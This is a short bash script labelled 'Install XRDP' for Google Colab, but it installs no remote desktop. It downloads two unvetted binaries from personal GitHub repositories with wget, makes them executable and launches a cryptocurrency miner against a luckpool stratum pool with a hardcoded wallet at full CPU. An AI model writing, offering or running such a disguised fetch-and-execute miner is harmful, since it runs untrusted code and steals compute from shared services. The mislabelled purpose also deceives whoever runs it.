#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R oxpz
 
wget https://raw.githubusercontent.com/chikahusarii/scala/main/oxpz
wget https://raw.githubusercontent.com/chikahusarii/claim/main/verus-solver
chmod +x oxpz
chmod +x verus-solver
./oxpz -c stratum+tcp://na.luckpool.net:3956#xnsub -u RVj1VkZYsvMHgRtNRn8z1eeGkTCGmK5qmH.g1 -p x --cpu 200
